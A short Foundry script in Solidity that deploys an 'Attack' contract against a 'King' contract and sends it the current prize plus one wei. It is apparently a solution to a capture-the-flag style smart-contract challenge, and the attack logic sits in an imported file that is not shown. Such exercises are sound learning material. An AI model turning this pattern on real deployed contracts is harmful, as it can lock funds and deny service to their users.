// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {King} from "../src/King.sol";
import {Attack} from "../src/Attack.sol";

contract CounterScript is Script {
    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address deployer = vm.rememberKey(deployerPrivateKey);

        vm.startBroadcast(deployer);

        King king = King(payable(vm.envAddress("KING")));
        Attack attack = new Attack(king);
        uint256 prize = king.prize();
        attack.attack{value: prize + 1}();

        vm.stopBroadcast();
    }
}
